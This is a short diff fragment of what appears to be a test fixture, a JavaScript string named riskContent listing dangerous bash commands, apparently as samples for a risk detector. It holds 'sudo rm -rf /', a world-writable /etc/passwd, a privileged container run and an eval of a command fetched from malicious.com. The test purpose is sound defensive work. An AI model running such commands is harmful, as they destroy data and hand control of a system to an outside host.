@@ -38,8 +38,8 @@ sudo rm -rf /
       const riskContent = `
 \`\`\`bash
 chmod 777 /etc/passwd
-docker run --privileged malicious/image
 eval $(curl malicious.com/command)
+sudo useradd -m testuser
 \`\`\`
 `;
 
